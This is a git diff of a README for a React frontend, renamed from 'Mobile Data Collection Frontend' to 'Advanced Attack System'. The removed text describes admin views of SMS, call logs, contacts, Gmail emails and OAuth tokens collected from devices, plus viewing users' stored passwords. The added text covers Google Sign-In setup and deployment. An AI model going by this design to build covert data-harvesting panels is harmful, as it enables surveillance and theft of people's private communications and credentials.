@@ -1,153 +1,252 @@
-# Mobile Data Collection Frontend
+# Advanced Attack System - Frontend
 
-A comprehensive React frontend for monitoring and managing mobile data collection, including notifications, emails, SMS, call logs, contacts, and device information.
+A React-based frontend for the Advanced Attack System, featuring Google Sign-In integration, admin dashboard, and comprehensive data management.
 
-## Features
+## 🚀 Features
 
-### Main Dashboard
-- **Device Overview**: View all connected mobile devices
-- **Real-time Statistics**: Monitor notifications, media files, and installed apps
-- **Device Details**: Access detailed information about each device
+- **Google Sign-In Integration**: Secure authentication using Google OAuth 2.0
+- **Admin Dashboard**: Comprehensive data management interface
+- **Real-time Data**: Live updates for notifications, emails, and device data
+- **Responsive Design**: Mobile-friendly interface
+- **Dark Mode Support**: Automatic theme switching
+- **Privacy & Legal**: Built-in Privacy Policy and Terms of Service pages
 
-### Admin Dashboard
-Access the admin dashboard at `/admin` to view comprehensive data management:
+## 📋 Prerequisites
 
-#### 📊 Admin Overview (`/admin`)
-- **Statistics Dashboard**: Overview of all collected data
-- **Quick Actions**: Direct links to all data views
-- **Real-time Counts**: Live statistics for all data types
+- Node.js 18+ 
+- npm or yarn
+- Google Cloud Console account (for Google Sign-In)
+- Backend API running
 
-#### 📱 Devices Management (`/admin/devices`)
-- **Device List**: All registered devices with detailed information
-- **Device Details**: Manufacturer, model, Android version, SDK version
-- **Installed Apps**: Complete list of apps on each device
-- **Status Monitoring**: Active/inactive device status
-- **Search & Filter**: Find devices by ID, manufacturer, or model
+## 🛠️ Installation
 
-#### 👥 Users Management (`/admin/users`)
-- **User Profiles**: Complete user information and metadata
-- **Password Access**: View stored passwords from metadata
-- **Device Association**: Link users to their devices
-- **Activity Tracking**: Last login and activity timestamps
-- **Monitor URLs**: Direct links to user monitoring pages
+1. **Clone the repository**
+   ```bash
+   git clone <repository-url>
+   cd frontend
+   ```
 
-#### 🔔 Notifications Management (`/admin/notifications`)
-- **Notification History**: All collected notifications from devices
-- **App Filtering**: Filter by app name, package name, or category
-- **Read Status**: Track read/unread notifications
-- **Detailed View**: Full notification content and metadata
-- **Device Association**: Link notifications to specific devices
-
-#### 📧 Emails Management (`/admin/emails`)
-- **Gmail Integration**: All emails from connected Gmail accounts
-- **Account Filtering**: Filter emails by Gmail account
-- **Email Content**: Full email body, attachments, and metadata
-- **Status Tracking**: Read, starred, and important status
-- **Search Functionality**: Search by sender, subject, or content
-
-#### 💬 SMS Management (`/admin/sms`)
-- **SMS History**: All SMS messages from devices
-- **Type Filtering**: Inbox, sent, draft, failed messages
-- **Contact Association**: Link SMS to phone numbers
-- **Message Content**: Full SMS body and metadata
-- **Device Tracking**: Associate SMS with specific devices
-
-#### 📞 Call Logs Management (`/admin/call-logs`)
-- **Call History**: All call logs from devices
-- **Call Types**: Incoming, outgoing, missed, rejected calls
-- **Duration Tracking**: Call duration and timestamps
-- **Contact Names**: Associated contact information
-- **Device Association**: Link calls to specific devices
-
-#### 👤 Contacts Management (`/admin/contacts`)
-- **Contact List**: All contacts from devices
-- **Contact Details**: Names, phone numbers, email addresses
-- **Device Association**: Link contacts to specific devices
-- **Search Functionality**: Find contacts by name or number
-
-#### 📮 Gmail Accounts Management (`/admin/gmail-accounts`)
-- **Account Overview**: All connected Gmail accounts
-- **Access Tokens**: Monitor OAuth token status
-- **Sync Information**: Last sync time and status
-- **Account Management**: Delete accounts and manage access
-- **Email Statistics**: Total emails per account
-
-## API Endpoints
-
-### Admin Statistics
-- `GET /api/admin/stats` - Get overall statistics
-
-### Data Management
-- `GET /api/users` - Get users with pagination
-- `GET /api/devices` - Get devices with pagination
-- `GET /api/notifications` - Get notifications with pagination
-- `GET /api/gmail/emails` - Get emails with pagination
-- `GET /api/sms` - Get SMS with pagination
-- `GET /api/callLogs` - Get call logs with pagination
-- `GET /api/contacts` - Get contacts with pagination
-- `GET /api/gmail/accounts` - Get Gmail accounts with pagination
-
-## Features
-
-### 🔍 Search & Filter
-- **Real-time Search**: Search across all data types
-- **Advanced Filtering**: Filter by status, type, category, or date
-- **Pagination**: Handle large datasets efficiently
-
-### 📊 Data Visualization
-- **Statistics Cards**: Overview of data counts
-- **Status Badges**: Visual indicators for data status
-- **Progress Tracking**: Monitor data collection progress
-
-### 🔐 Security
-- **Protected Routes**: Admin access control
-- **Data Privacy**: Secure handling of sensitive information
-- **Audit Trail**: Track all data access and modifications
-
-### 📱 Responsive Design
-- **Mobile-Friendly**: Works on all device sizes
-- **Modern UI**: Clean, professional interface
-- **Accessibility**: Screen reader and keyboard navigation support
-
-## Getting Started
-
-1. **Install Dependencies**:
+2. **Install dependencies**
    ```bash
    npm install
    ```
 
-2. **Start Development Server**:
+3. **Set up environment variables**
    ```bash
-   npm start
+   cp .env.example .env.local
    ```
 
-3. **Access the Application**:
-   - Main Dashboard: `http://localhost:3000`
-   - Admin Dashboard: `http://localhost:3000/admin`
+4. **Configure environment variables**
+   ```env
+   # API Configuration
+   REACT_APP_API_URL=http://localhost:3000/api
+   REACT_APP_ENV=development
 
-## Navigation
+   # Google Sign-In
+   REACT_APP_GOOGLE_CLIENT_ID=your_google_client_id_here
 
-### Main Dashboard
-- **Dashboard**: Overview of connected devices
-- **Notifications**: View all notifications
-- **Media**: View all media files
-- **Admin Dashboard**: Access comprehensive admin panel
+   # Google Analytics
+   REACT_APP_GA_TRACKING_ID=your_ga_tracking_id_here
+   ```
 
-### Admin Dashboard
-- **Overview**: Statistics and quick actions
-- **Devices**: Manage all devices
-- **Users**: Manage all users
-- **Notifications**: Manage all notifications
-- **Emails**: Manage all emails
-- **SMS**: Manage all SMS messages
-- **Call Logs**: Manage all call logs
-- **Contacts**: Manage all contacts
-- **Gmail Accounts**: Manage all Gmail accounts
+## 🔧 Google Sign-In Setup
 
-## Data Privacy
+### 1. Create Google Cloud Project
+1. Go to [Google Cloud Console](https://console.cloud.google.com/)
+2. Create a new project or select existing one
+3. Enable the Google+ API
 
-This application is designed for legitimate data collection and monitoring purposes. All data is stored securely and access is controlled through proper authentication and authorization mechanisms.
+### 2. Configure OAuth 2.0
+1. Go to "APIs & Services" > "Credentials"
+2. Click "Create Credentials" > "OAuth 2.0 Client IDs"
+3. Choose "Web application"
+4. Add authorized JavaScript origins:
+   - `http://localhost:3000` (development)
+   - `https://yourdomain.com` (production)
+5. Add authorized redirect URIs:
+   - `http://localhost:3000` (development)
+   - `https://yourdomain.com` (production)
 
-## Support
+### 3. Get Client ID
+1. Copy the generated Client ID
+2. Add it to your `.env.local` file:
+   ```env
+   REACT_APP_GOOGLE_CLIENT_ID=your_client_id_here
+   ```
 
-For technical support or questions about the admin dashboard, please refer to the backend documentation or contact the development team.
+## 🚀 Running the Application
+
+### Development Mode
+```bash
+npm run dev
+```
+- Runs on `http://localhost:3000`
+- Hot reload enabled
+- Development environment
+
+### Production Mode
+```bash
+npm run prod
+```
+- Optimized build
+- Production environment
+- Environment variables from `.env.production`
+
+### Build for Production
+```bash
+npm run build
+```
+- Creates optimized production build
+- Output in `build/` directory
+
+## 📁 Project Structure
+
+```
+src/
+├── components/          # React components
+│   ├── auth/           # Authentication components
+│   ├── dashboard/      # Dashboard components
+│   └── common/         # Shared components
+├── hooks/              # Custom React hooks
+├── context/            # React context providers
+├── services/           # API services
+├── utils/              # Utility functions
+├── pages/              # Page components
+└── config/             # Configuration files
+```
+
+## 🔐 Authentication
+
+### Google Sign-In Flow
+1. User clicks "Sign in with Google"
+2. Google OAuth popup appears
+3. User authorizes the application
+4. Google returns JWT credential
+5. Frontend sends credential to backend
+6. Backend verifies and creates/updates user
+7. Backend returns JWT token
+8. Frontend stores token and redirects to dashboard
+
+### Protected Routes
+- All admin routes require authentication
+- JWT token stored in localStorage
+- Automatic token refresh
+- Redirect to login if unauthorized
+
+## 🎨 Styling
+
+- **CSS Modules**: Component-scoped styles
+- **Responsive Design**: Mobile-first approach
+- **Dark Mode**: Automatic theme detection
+- **Google Material Design**: Consistent with Google's design language
+
+## 📊 Data Management
+
+### Real-time Updates
+- WebSocket connections for live data
+- Automatic refresh intervals
+- Optimistic UI updates
+
+### Data Types
+- **Notifications**: App notifications from devices
+- **Emails**: Gmail integration data
+- **SMS**: Text message data
+- **Call Logs**: Phone call history
+- **Contacts**: Device contact lists
+- **Device Info**: Hardware and software details
+
+## 🔧 Configuration
+
+### Environment Variables
+- `REACT_APP_API_URL`: Backend API URL
+- `REACT_APP_GOOGLE_CLIENT_ID`: Google OAuth Client ID
+- `REACT_APP_GA_TRACKING_ID`: Google Analytics ID
+- `REACT_APP_ENV`: Environment (development/production)
+
+### API Configuration
+- Base URL configuration in `src/config/constants.js`
+- Request/response interceptors
+- Error handling middleware
+- Authentication headers
+
+## 🧪 Testing
+
+```bash
+# Run tests
+npm test
+
+# Run tests with coverage
+npm run test:coverage
+
+# Run tests in watch mode
+npm run test:watch
+```
+
+## 📦 Deployment
+
+### Vercel (Recommended)
+1. Connect your GitHub repository to Vercel
+2. Set environment variables in Vercel dashboard
+3. Deploy automatically on push to main branch
+
+### Manual Deployment
+1. Build the application: `npm run build`
+2. Upload `build/` directory to your web server
+3. Configure server to serve `index.html` for all routes
+
+## 🔒 Security
+
+### Best Practices
+- Environment variables for sensitive data
+- HTTPS in production
+- Content Security Policy headers
+- XSS protection
+- CSRF protection via JWT tokens
+
+### Google Sign-In Security
+- Client ID validation
+- JWT token verification
+- Secure token storage
+- Automatic token refresh
+
+## 📝 Legal
+
+### Privacy Policy
+- Accessible at `/privacy`
+- GDPR compliant
+- Data collection disclosure
+- User rights information
+
+### Terms of Service
+- Accessible at `/terms`
+- Service usage terms
+- User obligations
+- Liability limitations
+
+## 🤝 Contributing
+
+1. Fork the repository
+2. Create a feature branch
+3. Make your changes
+4. Add tests if applicable
+5. Submit a pull request
+
+## 📄 License
+
+This project is licensed under the MIT License - see the LICENSE file for details.
+
+## 🆘 Support
+
+For support and questions:
+- Create an issue in the repository
+- Contact: support@yourcompany.com
+- Documentation: [Link to docs]
+
+## 🔄 Changelog
+
+### v1.0.0
+- Initial release
+- Google Sign-In integration
+- Admin dashboard
+- Real-time data management
+- Privacy Policy and Terms of Service pages
